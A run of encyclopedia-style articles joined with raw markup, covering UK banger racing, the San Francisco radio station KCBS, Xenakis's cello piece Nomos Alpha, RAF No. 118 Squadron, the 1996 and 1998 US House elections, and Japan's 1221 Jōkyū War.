The sport has become a leading formula in short oval racing in the UK and Ireland, regularly drawing large numbers of both competitors and spectators. As the sport&#x27;s popularity exploded during the 1970s and 1980s, many venues began to host banger events, building a strong driver and fan base in the process. These tracks and promotions began to host championship events to find out their fastest and most talented drivers. PRI was the first promotion to do so, holding their first World Final in 1971 at Harringay Stadium.

The Spedeworth Unlimited Banger World Final was another of these big championship events and is considered to be the sports flagship event. The first title race was held in October 1974 at Wimbledon Stadium. Plough Lane was the venue for this annual event until 2007 when changes to London traffic laws meant it had to be relocated. From 2008 the meeting was relocated to Ipswich and has continued to thrive, attracting more drivers than the Wimbledon World Finals were able to facilitate.

Around the late 1980s and early 1990s, promoters began hosting &#x27;open&#x27; meetings with significant prize funds and very little regarding car limitations; the first of these being held was Ringwood Raceway&#x27;s &#x27;British Open&#x27; and the Arena Essex &#x27;Firecracker 500&#x27;. Meetings like these continued to grow over the coming years, producing more cars and attracting drivers from all over the UK and often overseas. The &#x27;Firecracker&#x27; event held at Arena Essex was so popular that it became the venue&#x27;s biggest meeting for fans and drivers alike, and was subsequently held every year until the stadium&#x27;s closure in 2018.

The peak number of cars to compete in one season was around 13,000 in 2003, of which around 9,500 were &#x27;fresh&#x27; and had not been raced at any previous meetings.

As for individual meetings, the largest turnouts vary depending on the banger class racing. Meetings with 200+ bangers in attendance would be considered some of the biggest in the sport&#x27;s history.

The largest accurate meeting turnout on record was the Spedeworth Unlimited National Banger World Final of 2017 in which 269 cars were in attendance. The &#x27;Heavy Metal Classic&#x27; meetings hosted at Standlake, are the only ones to come close to this figure with a turnout of 266 at the 2005 running and 265 cars the following year, however both of these meetings consisted of &#x27;Unlimited&#x27; and &#x27;Under 1800cc&#x27; bangers.

Banger team meetings have also become popular in recent times, producing turnouts of over 200 cars on some occasions. The Unlimited &#x27;Icebreaker&#x27; meeting, held at Swaffham Raceway on 8 February 1998 drew 209 competitors. Not only was this event the first of its kind to break this barrier, but at the point of running, it was the largest accurate turnout on record. Since then, there have been many other team meetings that have produced 200+ turnouts. The biggest team meeting on record was the Unlimited teams event held at Oval Emmem in 2016, which produced a turnout of 240 cars, also making it the biggest turnout at any Dutch venue.

Another turnout of significance in the sport is the 2013 Olly Moran Memorial weekend held at Arena Essex in 2013. This meeting holds the record for being the biggest &#x27;one-make&#x27; turnout in the sport&#x27;s history, as every driver in attendance had to race either a &#x27;Mark I&#x27; or &#x27;Mark II&#x27; variant of the Ford Granada. This meeting achieved a turnout of 232 over the two days, with the Sunday running of the event becoming one of the community&#x27;s most highly regarded meetings.

The final landmark meeting worth mention is the 2018 Stan Woods Memorial meeting at Stoke which turned out a total of 192 cars. This meeting was special for the reason that the event consisted only of cars which started production before 1975, making it the largest ever classic car meeting turnout. What makes this meeting all the more special, is that the turnout grew each year from the creation of the event back in 2012, however since event moved to Odsal Stadium, the limited pit space means these numbers are unlikely to be repeated.

==Racing==

Banger racing within the UK is usually held to one of three rule presets that consist of varying degrees of contact during races. &#x27;National&#x27; banger racing is the only one which is full-contact. Drivers are allowed to pull off aggressive hits like &#x27;t-bones&#x27;, &#x27;head ons&#x27;, &#x27;follow ins&#x27; and &#x27;jack ups&#x27; that are not allowed in other types of banger racing. Meetings held to National rulings are very popular and usually more destructive than any other.

&#x27;Rookie&#x27; banger racing is a format designed to prolong the life of driver&#x27;s cars with limited contact between drivers. The idea was brought about in the mid-1990s for those wishing to race bangers across the course of a season on a small budget. The reduced costs and crashes mean it is a safer and less aggressive environment for drivers, but not as popular with fans. The &#x27;Rookie&#x27; banger format is commonly seen as a stepping stone for drivers who are looking to step up to the &#x27;National&#x27; banger scene, with many drivers stepping up or partaking in both throughout their careers.

&#x27;Back to Basic&#x27; banger racing is an emerging part of the banger world, that is growing in success and popularity by acting as an entry-level way for fans to break into the sport. Racing is often held in the same style as the &#x27;Rookie&#x27; banger division, but car preparation is scaled back, with drivers being able to leave in dashboards and on-key ignition, that would normally have to be removed. Drivers are also not allowed to protect their vehicles as much, with cars usually being stripped-down versions of how they appeared on the road. This is currently seen as the cheapest and easiest way to race bangers and harks back to the sport&#x27;s roots of simple preparation and large grid sizes.

A banger race is distinct from a destruction derby, as the objective of the latter is not to turn laps, but to smash, destroy and ultimately immobilise all of the opposition, until only one vehicle is left. On occasions, though, the final event at a &#x27;National&#x27; or &#x27;Back to basic&#x27; Banger meeting may be a demolition derby where the cars that have raced compete to be the last one standing. At special events, caravans or small boats may be towed by racers during the demolition derby for added destruction during the event.

At regular banger events, cars are gridded across the track, sometimes in a graded order of driver success, and then sent away to give a rolling start for the beginning of a race.

Despite the racing element of the sport, the community often categorise drivers into two different groups. There are those who are regarded as &#x27;rodders&#x27;, a term derived from the Hot Rod formulas that also commonly race on short ovals. These drivers aim to win races by any means possible. There are also those who are known as &#x27;wreckers&#x27; and compete with the intention of destroying their own and other racer&#x27;s cars. Wreckers are often more popular with the crowd, although drivers who win races and qualify for the world final are also respected.

Along with trophies for race winners and podium finishers, there are often trophies presented to the &#x27;Best wrecker&#x27;, &#x27;Best entertainer&#x27; and &#x27;Demolition derby winner&#x27;, in order to attract drivers of both persuasions. Another trophy often given is a &#x27;best car&#x27; award which is usually either given to the best-presented vehicle or the rarest car; with the latter being the subject of much controversy with classic car enthusiasts.

In a banger race, yellow flags are used during the race to warn drivers that caution is required. Cars which stall or are stopped by opposing drivers are usually left on the course while the race continues. In recent times, drivers have been encouraged to remain inside a disabled car while the race continues, as this is adjudged to be the safest option. The largest association of European promoters has indeed mandated this, it is now a punishable offence to leave a car during &#x27;green flags&#x27; unless deemed an emergency situation. If it is deemed necessary to move them or if a driver is in particular danger (including fire), a red flag may be used to stop the race. Races are then usually restarted when the situation has been cleared.

==Criticism==
Some vehicle enthusiasts object to banger racing, claiming it is responsible for the destruction of classic cars and the reason why many models, such as the Ford Granada, have become rare. The banger community maintain that a large percentage of vehicles raced are beyond restoration.

<doc id="1341440" wikidata="Q6326585" url="?curid=1341440" title="KCBS (AM)">
<text>KCBS (740 kHz) is an all-news AM radio station located in San Francisco, California. It is owned by Audacy, Inc. (formerly Entercom), which took over after its merger with CBS Radio.

KCBS formerly shared its Battery Street studios with CBS owned-and-operated television station KPIX-TV 5. The transmitter site is located in Novato. Its programming is simulcast on co-owned 106.9 KFRC-FM plus that station&#x27;s HD1 digital sub-channel. It is Northern California&#x27;s primary entry point station for the Emergency Alert System.

KCBS operates with a transmitter output of 50,000 watts, and during the daytime can be regularly received as far north as Red Bluff and Hopland and south as far as San Luis Obispo. In good conditions it is also heard as far north as Redding and south to Santa Maria. At night, the station employs a directional antenna, primarily sending its signal to the southeast, in order to protect CFZM in Toronto, the dominant Class A station on the 740 kHz clear-channel frequency. Even with this restriction, KCBS&#x27;s nighttime signal reaches a large slice of the Western United States with a good radio. This includes almost all of California, as far south as Los Angeles and San Diego. On rare occasions &quot;DXers&quot; (hobbyists who listen for distant stations) have reported receiving KCBS across the Pacific Ocean, and in Hawaii and Alaska.

In addition to over-the-air broadcasts, KCBS audio is webcast with live streaming audio around the clock. The station&#x27;s live stream was also available through TuneIn and most streaming audio apps until August 1, 2018, when it was pulled from all streaming media sources except the Radio.com mobile app (now Audacy) where it is now available exclusively; in October 2019, it was one of the test stations for the app&#x27;s new &quot;Radio.com Rewind&quot; feature, where the last 24 hours of KCBS programming can be accessed on-demand.

==Programming==
Like most of its sister Audacy all-news stations, KCBS airs hourly CBS News Radio reports, including the &quot;CBS World News Roundup&quot; on weekdays and the &quot;CBS News Weekend Roundup&quot; on Saturday and Sunday early mornings. It simulcasts the audio portion of the weekly CBS News TV programs &quot;60 Minutes&quot; and &quot;Face the Nation&quot;. Additional features include traffic, weather, sports updates, and &quot;Bloomberg Moneywatch&quot; business reports. KPIX-TV meteorologists provide weather forecasts, especially during AM and PM drive times.

&quot;KCBS Cover Story&quot; airs weekly as an extended look at a major issue in the news, while &quot;In Depth&quot; is a weekly long-form interview program. KCBS also simulcasts a seven-minute block of the &quot;CBS Evening News&quot; East Coast feed live on weekdays, allowing listeners to hear the program&#x27;s top stories two hours before the newscast airs on KPIX-TV. The station hosts special segments each weekday with CBS News technology analysts Larry Magid and Brian Cooley, &quot;San Francisco Chronicle&quot; columnist Phil Matier, and others. KCBS will often feature live interviews with call-in guest experts (who occasionally also appear in the studio with the anchors) to briefly discuss a specific story, topic or subject; the edited comments are replayed as part of featured news stories throughout the remainder of the day.

==History==
===Experimental years===

KCBS is considered to be among the world&#x27;s first radio stations. It received its first broadcasting station license, as KQW in San Jose, in early December 1921. However, the original licensee, Charles Herrold, had begun making audio radio transmissions in 1909, as part of an experimental radio-telephone system, and KCBS has traditionally dated its founding to that year. Herrold&#x27;s earliest radio work had been largely forgotten until 1959, when Gordon R. Greb&#x27;s &quot;The Golden Anniversary of Broadcasting&quot; was published in the &quot;Journal of Broadcasting&quot;.

On January 1, 1909, Herrold opened the Herrold College of Wireless and Engineering, located in the Garden City Bank Building at 50 West San Fernando Street in San Jose. In order to promote the college, as well as provide practical experience for his students, a radio transmitter (then commonly known as &quot;wireless telegraphy&quot;) with a large antenna was constructed atop the building. The earliest transmissions used spark-gap transmitters which could only transmit the dots-and-dashes of Morse code.

Herrold was among the first to develop a radio transmitter that could also be used for audio transmissions. After limited success with an approach that used &quot;high-frequency&quot; sparks, he later began using a version of an &quot;arc-transmitter&quot; originally developed by Valdemar Poulsen. Although his primary objective was to create a wireless telephone that could be commercialized for point-to-point use, beginning in July 1912 Herrold also began making regular weekly entertainment broadcasts, with the debut program featuring phonograph records supplied by the Wiley B. Allen company.

Radio communication was initially unregulated in the United States, and at first Herrold used a variety of self-assigned identifiers for his station, including FN and SJN, plus, for audio transmissions, &quot;San Jose calling&quot;. The Radio Act of 1912 established the licensing of stations through the U.S. Commerce Department, and in late 1915 Herrold was issued an Experimental Station License with the call sign 6XF. Although Herrold reported success in developing his system, his arc-transmitters were low-powered and would only work at wavelengths above 600 meters (frequencies below 500 kHz). The concurrent development of vacuum-tube technology, which did not have the same limitations, started making arc technology obsolete.

===World War I===
In April 1917, with the entrance of the United States into World War I, the U.S. government took control of the entire radio industry, and it became illegal for private citizens to possess a working radio receiver. In addition, all civilian radio stations were ordered to be dismantled, so for the duration of the conflict Herrold left the airwaves. This wartime government ban on civilian stations was lifted effective October 1, 1919, and in early 1921 Herrold was reissued an Experimental license, again with the call sign 6XF. (He had previously been issued a license for a portable transmitter, with the call sign 6XE.)

During the war impressive strides had been made in vacuum-tube transmitter and receiver design, and Herrold&#x27;s arc-transmitters were no longer commercially competitive. In 1920 a number of radio stations in the San Francisco Bay area, employing vacuum-tube transmitters, began making regular entertainment broadcasts, most prominently the &quot;California Theater&quot; station, 6XC, set up by Lee de Forest, which began daily service around April 1920. After the war Herrold needed to become familiar with vacuum-tube equipment before he could return to the air. Although some of his co-workers later reported that he resumed regular broadcasts as early as 1919, the oldest documented report of his resumption of broadcasting, presumably over 6XF, dates to early May 1921, with the announcement that the school was inaugurating a Monday and Thursday night schedule consisting of records supplied by &quot;J. A. Kerwin of 84 East Santa Clara street, dealer in phonographs&quot;.

===KQW (1921–1949)===

Effective December 1, 1921, the Department of Commerce issued a regulation that stations making broadcasts intended for the general public now had to hold a Limited Commercial license specifying operation on a wavelength of 360 or 485 meters, and, on December 9, 1921, a broadcasting station authorization with the randomly assigned call letters of KQW was issued in Herrold&#x27;s name. This license specified operation on the common &quot;entertainment&quot; wavelength of 360 meters (833 kHz), so KQW initially broadcast only during the hours assigned to it under a time-sharing agreement made with the other local broadcasting stations.

Classifying stations according to when they first received a broadcasting authorization under the provisions of the December 1, 1921, regulations, KQW was tied for 6th in the state of California and 16th in the United States. It is the eighth oldest surviving radio station in the United States and tied for 2nd oldest in California, one day behind KWG in Stockton, and tied with KNX in Los Angeles. It is also the oldest in the Bay Area; the next-oldest, KMKY in Oakland, was licensed as KLS on March 10, 1922.

Operation of KQW was financed by the sale of radio equipment by the Herrold Radio Laboratory, but by 1925 the costs had grown. The station was transferred to the First Baptist Church of San Jose, with Herrold kept on as program director. In 1926, station manager Fred J. Hart bought KQW&#x27;s license and facilities, eventually buying the station itself in 1930. From 1937 to 1941, KQW served as the San Jose network affiliate of the Don Lee Broadcasting System. During this time its owner was Julius Brunton &amp; Sons, and the station&#x27;s operations were co-located with KJBS at 1470 Pine Street in San Francisco. Until 1942, it operated as a service of the Pacific Agricultural Foundation to farmers in the Central Valley.

In 1927, the Federal Radio Commission (FRC) was created to take over the regulation of U.S. radio stations, and it began a series of frequency shifts to coordinate station assignments. Effective November 11, 1928, the FRC divided the AM band transmitting frequencies into three classification: Local, Regional, and Clear Channel. KQW&#x27;s assignment, 1010 kHz, which it had been using since the previous year, was designated a regional frequency. By 1940, KQW had increased its daytime power to the maximum permitted for regional stations, 5,000 watts. In March 1941, under the provisions of the North American Regional Broadcasting Agreement (NARBA), most U.S. radio stations were shifted to new dial positions, so KQW moved to 740.

Under the NARBA provisions, 740 was a Canadian Clear channel, with CBL (740 AM) (since transferred to FM; the frequency now is utilized by CFZM using the same technical perimeters) as the frequency&#x27;s Class I-A primary station. KQW was classified as a Class II secondary station. However, the great distance between the two stations meant that, with the use of a directional antenna, KQW could apply for permission to increase its power to 50,000 watts. In the early 1940s, the San Francisco Bay area affiliate for the CBS radio network was KSFO, which, because it operated on a regional frequency, was limited to a power of 5,000 watts. CBS wanted to have a station operating at a full 50,000 watts, and an agreement was initially made for KQW and KSFO to swap frequencies — KSFO to 740 and KQW to 560 — after which KSFO would upgrade to 50,000 watts. However, this plan fell through because CBS also wanted to own the Bay Area affiliate, and the owners of KSFO were not willing to sell. Due to this rebuff, in 1942 CBS transferred its affiliation from KSFO to KQW, with an option to eventually purchase KQW. The station staff moved to a CBS-owned studio located at the Palace Hotel. For all intents and purposes, it was now a San Francisco station. However, it was still licensed to San Jose, so an announcer was posted at the transmitter site to provide the required &quot;KQW, San Jose&quot; legal IDs.

===The beginning of KCBS (1949–1995)===

CBS exercised its option to buy KQW in 1949, changing the station&#x27;s call letters to KCBS. In 1951, KCBS signed on for the first time from the four-tower 50,000-watt facility at Novato that had originally been intended for KSFO. KCBS&#x27;s city of licence was also officially changed from San Jose to San Francisco.

In 1968, KCBS became one of the first all-news stations in the country, as CBS was converting many of its radio stations nationwide to the format, developed at WCBS in New York City. KCBS already had a long history in news dating back to World War II, when it was the center of CBS&#x27; newsgathering efforts in the Pacific Theater. In 1971, KCBS moved its studios to the 32nd floor of One Embarcadero Center. Notable anchors and reporters who became popular during the early &quot;Newsradio&quot; era included Al Hart, Frank Knight, Dave McElhatton (whose KCBS tenure dated to the early 1950s, including hosting a popular morning show on the station before the all-news format was implemented; McElhatton moved to KPIX-TV in 1977, where he was a highly popular and trusted lead anchorman until his retirement in 2000), Ray Hutchinson (KCBS&#x27; first business anchor under the all-news format, delivering his updates from the floor of the Pacific Stock Exchange), Ken Ackerman (who began on the station in 1942, later hosting KCBS&#x27; version of &quot;Music &#x27;Til Dawn&quot; and eventually becoming a news anchor under the all-news format, serving until his retirement in 1995), Bob Price, a longtime business anchor and editor for KCBS who worked for over 20 years at the radio station, anchored from the Pacific Stock Exchange until his retirement on November 5, 2009.

Throughout its early history, KCBS also broadcast local sports. As early as 1949, KCBS broadcast Stanford University football games. Upon converting to its all-news format in 1968, KCBS stopped broadcasting Stanford sports, whose broadcasts moved to rival KSFO. In 1985, KCBS signed a three-year contract to broadcast Stanford football and men&#x27;s basketball. In 1992, Stanford dropped KCBS in favor of KFRC-AM in 1992 in order to find a station that would devote more airtime to discuss Stanford sports than KCBS could with its all-news format. From 1980 to 1986, KCBS broadcast San Jose State football. However, KCBS carried most San Jose State games on tape delay in the 1986 season due to conflicts with Stanford games. KCBS did not renew its contract with San Jose State after it expired, and San Jose station KHTT won San Jose State broadcast rights beginning in 1987. From 1981 to 1986, KCBS was the flagship station for the San Francisco 49ers. In 1990, KCBS became the primary station for the Bay Area&#x27;s Emergency Broadcast System after KNBR, the former primary EBS station, failed to activate the Emergency Broadcast System due to major technical malfunctions caused by the engineering department at KNBR during and the aftermath of the 1989 Loma Prieta earthquake. The Federal Communications Commission called the situation &quot;revoked&quot; as the decision was made to move its primary EBS status to KCBS after the major fail on KNBR.

===Common ownership with KPIX (1995–2017)===
In late November 1995, the Westinghouse Electric Corporation bought CBS, bringing the Bay Area&#x27;s oldest radio station under common ownership with its oldest television station, KPIX-TV Channel 5, which Westinghouse had purchased from Associated Broadcasters in 1954. In May 2006, KCBS and KPIX-TV moved their news bureau in San Jose to the Fairmont Tower at 50 West San Fernando Street. This was, coincidentally, the location of Charles Herrold&#x27;s original broadcasts. CBS management was unaware of the San Fernando Street address&#x27; history when the move was planned. However, once informed that this was the birthplace of KCBS, they recognized this at the bureau&#x27;s opening celebration.

In mid-March 2005, KCBS, along with nearly all of the other all-news stations owned by Infinity Broadcasting (which renamed itself CBS Radio that fall), began streaming its audio over its website, reversing a long-standing Infinity Radio policy of not doing so. (New York City&#x27;s WCBS began streaming its programming online the previous December). Local commercials which are heard on the radio signal are replaced on the internet stream for nationally and regionally sponsored ads, a few public service announcements, station promos, promos of CBS Television shows, and repeats of pre-recorded feature segments already on the broadcast schedule (including &quot;StarDate&quot; and &quot;Science Today,&quot; produced by the University of California). In March 2010, KCBS and the other CBS Radio stations blocked Internet listeners outside the United States from accessing its live stream.

In 2007, KCBS added an HD Radio digital sub-channel, and began identifying as &quot;KCBS and KCBS-HD&quot;. On October 27, 2008, the station began simulcasting its full schedule over co-owned KFRC-FM (106.9) and that station&#x27;s HD1 digital sub-channel. (KFRC-FM&#x27;s previous &quot;classic hits&quot; format was moved to 106.9 HD2.) The stations&#x27; microphone flag now displays &quot;740&quot; on two sides of the cube, and &quot;106.9&quot; on the other two. In 2011 the stations adopted the joint branding of &quot;All News 106.9 and AM 740, KCBS&quot;. KFRC-FM did not change its call letters because the KCBS-FM call sign was already in use by a CBS owned station in Los Angeles on 93.1 FM. Additionally, CBS wanted to keep another Bay Area station from trading on the KFRC calls&#x27; legacy in the area.

===Sale to Entercom===
On February 2, 2017, CBS Radio announced it would merge with Entercom. While CBS shareholders retained a 72% ownership stake in the combined company, Entercom was the surviving entity, separating KCBS radio from KPIX. The merger was approved on November 9, 2017, and was consummated on November 17. As part of the agreement with CBS, Entercom was given the rights to use the brand and trademarks for KCBS (along with sister stations KCBS-FM in Los Angeles, and WCBS-FM in New York City) for a 20-year period, after which Entercom (or succeeding entity) will be required to relinquish these call signs. On March 30, 2021, Entercom changed its name to Audacy.

==Pioneer station status==

One of the conditions of Herrold&#x27;s sale of KQW in 1925 was that the new owners include, in the sign-on announcement, the following: &quot;This is KQW, pioneer broadcasting station of the world, founded by Dr. Charles D. Herrold in San Jose in 1909&quot;.

Although there are reports that Herrold was making experimental audio transmissions as early as 1909, the best evidence is that it wasn&#x27;t until July 1912 when he began making regularly scheduled broadcasts. These weekly programs are generally accepted as being the first regular entertainment broadcasts made by radio. More contentious is whether KCBS can be considered the oldest radio station in continuous service, due to the fact that, following the end of World War I, Herrold did not resume regular broadcasting until May 1921. (Other candidates for oldest U.S. radio station include 8MK / WWJ in Detroit, which began regular broadcasts in August 1920; WOC in Davenport, Iowa, which traces its origin to station 9BY, beginning regular broadcasts around September 1920; 9ZAF/KLZ in Denver, with nightly concerts beginning in October 1920; and 8ZZ/KDKA in Pittsburgh, which began operating on November 2, 1920.)

In 1945, stations WWJ and KDKA held competing 25th anniversary celebrations, both claiming to be the oldest &quot;commercial radio station&quot;. Later that same year, KQW prepared and broadcast &quot;The Story of KQW&quot;. The program made the claim that KCBS is the oldest radio station, predating by eleven years both WWJ and KDKA. This broadcast included a brief recorded statement by Herrold, made just before his 70th birthday. All three of these stations, WWJ, KDKA and KCBS, eventually came under the common ownership of CBS Radio and remain sister stations under the ownership of Audacy.

==Landmark status==
A commemorative plaque designating 50 Fairmont Plaza, San Jose, California as the site of the &quot;World&#x27;s First Broadcasting Station&quot; was established on January 14, 1983, as California Historical Landmark 952. The plaque was placed by the California State Parks in cooperation with the California Pioneers of Santa Clara County and Mountain Charlie Chapter No. 1850, E Clampus Vitus, on April 3, 1984. The inscription on the marker reads: 

In 2009, KCBS celebrated its 100th birthday, with a yearlong series of events throughout the Bay Area. Included was the public dedication of a plaque commemorating the &quot;Centennial Celebration of the World&#x27;s First Broadcasting Station&quot;. This plaque is located outside the lobby at 50 Fairmont Plaza in San Jose, where Herrold&#x27;s original broadcasts took place. During the year, KCBS adopted the slogan &quot;The World&#x27;s First Broadcasting Station&quot;.

<doc id="1341443" wikidata="Q7048661" url="?curid=1341443" title="Nomos Alpha">
<text>Nomos Alpha () is a piece for solo cello composed by Iannis Xenakis in 1965, commissioned by Radio Bremen for cellist Siegfried Palm, and dedicated to mathematicians Aristoxenus of Tarentum, Évariste Galois, and Felix Klein. This piece is an example of a style of music called, by Xenakis, symbolic music – a style of music which makes use of set theory, abstract algebra, and mathematical logic in order to create and analyze musical compositions. Along with symbolic music, Xenakis is known for his development of stochastic music.

During his lifetime, Xenakis was a vocal critic of modern Western music since the development of polyphony for its diminished set of outside-time structures, especially when compared to folk and the Byzantine musical traditions. This perceived incompleteness of Western music was the main impetus for the development of symbolic music and for composing Nomos Alpha, his most well-known example of the genre.

&quot;Nomos Alpha&quot; consists of 24 sections divided into two layers. The first layer consists of every section not divisible by four, while the second layer consists of every fourth section.

==Layer 1==
Layer 1 of &quot;Nomos Alpha&quot; is determined by the 24-element octahedral group isomorphic to the rotations of a cube. The elements of the set are permutations and the binary operator is composition.

==Layer 2==
Layer 2 of &quot;Nomos Alpha&quot;—in contrast to Layer 1—is not determined by group theory, but is instead, a &quot;continuous motion of registral evolution&quot;.

<text>No. 118 Squadron was a squadron of the British Royal Air Force. Originally formed in 1918, it served as a fighter squadron in the Second World War, flying Spitfires and Mustangs. It flew jet fighters as part of RAF Germany in the 1950s, and Bristol Sycamore helicopters in Northern Ireland before finally disbanding in 1962.

==Operational history==

===First World War===
The squadron was formed as No. 118 Squadron Royal Flying Corps at Catterick Airfield, North Yorkshire, on 1 January 1918 with the intention of becoming a night bomber unit. It received a mixture of aircraft for training, including Airco DH.6s, Royal Aircraft Factory B.E.2s and Royal Aircraft Factory F.E.2bs. The squadron moved to Netheravon on 15 April that year, and again to Bicester Airfield on 7 August, with the intention that it would receive Handley Page O/400 heavy bombers before moving to France. A change of plans meant that it would wait for Vickers Vimys instead of the O/400s, but the squadron received none before being disbanded on 7 September 1918.

===Second World War===
On 20 February 1941, No. 118 reformed at RAF Filton, near Bristol, as a No. 10 Group fighter squadron equipped with Supermarine Spitfire Mk.I fighters, soon supplementing them with Spitfire Mk.IIs.It was commanded by Flight Lieutenant Frank Howell, an experienced fighter pilot. On 28 March, convoy patrols began and after moving to RAF Ibsley in April, it started to fly escort missions for anti-shipping strikes, as well as defensive patrols and fighter sweeps over northern France.

The squadron re-equipped with Spitfire Mk Vbs in September 1941, continuing to fly escort for anti-shipping strikes over the English Channel and for bombing raids. On 12 February it took part in the unsuccessful attempts to intercept the German battleships &quot;Scharnhorst&quot;, &quot;Gneisenau&quot; and heavy cruiser &quot;Prinz Eugen&quot; when they sailed through the Channel, escorting bombers searching for the German squadron. In August 1942, the Ibsley-based fighter wing, including 118 Squadron, moved to RAF Tangmere to support the Dieppe Raid. The squadron flew four missions during the day of the raid, claiming two Dornier Do 217 bombers destroyed.

The squadron moved to RAF Zeals in Wiltshire on 24 August and to RAF Coltishall in East Anglia on 17 January 1943, operating over Belgium, the Netherlands and the North Sea. A major task was escorting the light bombers of No. 2 Group RAF on raids over the Netherlands, often encountering heavy German opposition. A particularly violent engagement took place on 3 May 1943, when the Spitfires of 118, 167 and 504 Squadrons escorted the Lockheed Venturas of No. 487 Squadron RNZAF on a raid against a power station in Amsterdam. The German defences had been alerted by a fighter sweep earlier that day, and the raid was met by over 70 German fighters. Although 118 Squadron claimed two Focke-Wulf Fw 190s for the loss of one Spitfire, the escort could not keep the German fighters from the bombers of 487 Squadron, all but one of the Venturas being shot down.

The Squadron moved to RAF Peterhead in Aberdeenshire on 20 September to carry out defensive duties over northern Scotland, with a detachment at RAF Skeabrae in the Orkney Islands, moving to RAF Castletown in Caithness in October. In February 1944 the Squadron, by now equipped with more modern Spitfire IXs, moved to RAF Detling in Kent where it became part of Second TAF, but on 10 March it moved back to Skeabrae, remaining in Orkney for four months.

It moved south again in July 1944, flying escort missions over Normandy from RAF Detling until August. The Squadron moved to RAF Westhampnett in Sussex at the end of August, and to RAF Manston in September, flying escort missions for Bomber Command&#x27;s heavy bombers during daylight raids. The short range Spitfire was not ideal for the long-range escort missions now required, and in January 1945 the squadron, by now based at RAF Bentwaters, re-equipped with the longer-ranged North American Mustang, continuing these operations until the end of the war in Europe. In all it claimed 29 enemy aircraft destroyed during the war, with a further nine probably destroyed and 27 damaged. On 10 March 1946, the Squadron was disbanded.

===Post war operations - jets and helicopters===
The squadron again reformed as a fighter-bomber squadron serving in RAF Germany on 10 May 1951. It flew de Havilland Vampires out of RAF Fassberg in Lower Saxony, close to the border with East Germany. The Vampire was obsolete however, and in November 1953 the squadron received de Havilland Venoms. Even the Venom was outdated by 1955, and so the squadron discarded its Venoms in March that year when it moved to RAF Jever, operating swept-wing Hawker Hunters in the pure day-fighter role. It kept the Hunters until 22 August 1957 when it was disbanded as a result of the 1957 Defence Review.

On 1 September 1959, as a response to a campaign of attacks by the IRA, a detached Search and rescue flight of No. 228 Squadron at RAF Aldergrove equipped with three Bristol Sycamore helicopters was re-designated 118 Squadron on 1 September 1959. It flew its Sycamores in support of the Royal Ulster Constabulary (RUC), carrying out short range transport and reconnaissance missions. Other duties of the squadron included experiments in traffic control. On 31 August 1962, with the threat from the IRA ended by a ceasefire, the Squadron was disbanded.

They were a major disappointment for the Republicans, who were expecting to gain seats due to the embarrassment Clinton suffered during the Monica Lewinsky scandal and the &quot;six-year itch&quot; effect observed in most second-term midterm elections. However, the Republicans lost five seats to the Democrats, although they retained a narrow majority in the House. A wave of Republican discontent with Speaker Newt Gingrich prompted him to resign shortly after the election; he was replaced by Congressman Dennis Hastert of Illinois.

The campaign was marked by Republican attacks on the morality of President Bill Clinton, with independent counsel Kenneth Starr having released his report on the Lewinsky scandal and House leaders having initiated an inquiry into whether impeachable offenses had occurred. However, exit polls indicated that most voters opposed impeaching Clinton, and predictions of high Republican or low Democratic turnout due to the scandal failed to materialize. Some speculate that the losses reflected a backlash against the Republicans for attacking the popular Clinton. With the Republicans having lost four House seats and failing to gain any seats in the Senate, it was the first time since 1934 that the non-presidential party failed to gain congressional seats in a midterm election; this would happen again in 2002. This was the last election until 2024 where no incumbents who served at least 6 terms (12 years) lost re-nomination or re-election, and also the most recent where no Democratic incumbent lost renomination.

<text>The 1996 United States House of Representatives elections was an election for the United States House of Representatives on November 5, 1996, to elect members to serve in the 105th United States Congress. They coincided with the re-election of President Bill Clinton. Democrats won the popular vote by almost 60,000 votes (0.07%) and gained a net of two seats from the Republicans, but the Republicans retained an overall majority of seats in the House for the first time since 1928.

Although the Republicans lost three seats, one of them included an independent who would caucus with them and switch to the Republicans, resulting in a nine-seat Republican majority. A total of 12 freshman Republicans who were elected in the 1994 Republican Revolution were defeated in the election, while at least 36 were re-elected. 

The election was the fourth and final time in the 20th century in which either party won the House majority without winning the popular vote, with the previous three instances occurring in 1914, 1942, and 1952. In terms of the total vote, the 1996 result remains one of the closest in U.S. history. This remains the last election in which Republicans won a majority of seats in the New Jersey delegation, and it was also the first election since 1872 in which Republicans won a majority of seats in Mississippi&#x27;s delegation.

<text>, also known as the Jōkyū Disturbance or the Jōkyū Rebellion, was fought in Japan between the forces of Retired Emperor Go-Toba and those of the Hōjō clan, regents of the Kamakura shogunate, whom the retired emperor was trying to overthrow.

The main battle was at Uji, just outside imperial capital Kyōto; this was the third battle to be fought there in less than half a century. It took place in 1221, that is, the third year of the Jōkyū era.

==Background==
In the beginning of the 13th century, Emperor Go-Toba found his attempts at political maneuvers blocked by the Kamakura shogunate. Seeking independence, and the power he considered rightfully his as the ruler of Japan, Go-Toba gathered allies in 1221, and planned to effect an overthrow of the shogunate. These allies consisted primarily of members of the Taira clan, and other enemies of the Minamoto, the victors in the Genpei War, and clan of the &quot;shōguns&quot;.

Accounts of the first Imperial banner appear in this period, and the very first is said to have been one that Go-Toba gave to a general during this war. Sun and moon images were embroidered or painted with gold or silver on a red brocade.

==Provocation and attack==
In the fifth lunar month of 1221, the Retired Emperor Go-Toba decided on lines of succession, without consulting the shogunate and powerful Hojo clan. He then invited a great number of potential allies from amongst the eastern warriors of Kyoto to a great festival, thus revealing the loyalties of those who rejected the invitation. One important officer revealed his loyalty to the shogunate by doing so, and was killed. Several days later, the Imperial Court declared Hōjō Yoshitoki, the regent and representative of the shogunate, to be an outlaw, and three days later the entirety of eastern Japan had officially risen in rebellion.

Hōjō Yoshitoki decided to launch an offensive against Go-Toba&#x27;s forces in Kyoto, using much the same three-pronged strategy as was employed a few decades earlier. One came from the mountains, one from the north, and the third, commanded by Yoshitoki&#x27;s son Yasutoki, approached via the Tōkaidō road.

These forces faced meager opposition and resistance on their way to the capital; the Imperial commanders were simply outfought. When Go-Toba heard of this string of defeats, he left the city for Mount Hiei, where he asked for aid from the &quot;sōhei&quot;, the warrior monks of Mount Hiei. They declined, citing weakness, and Go-Toba returned to Kyoto. The remnants of the Imperial army fought their final stand at the bridge over the river Uji, where the opening battle of the Genpei War had been fought 41 years earlier. Yasutoki&#x27;s cavalry pushed through, scattering the Imperial forces, and pressed on to Kyoto.

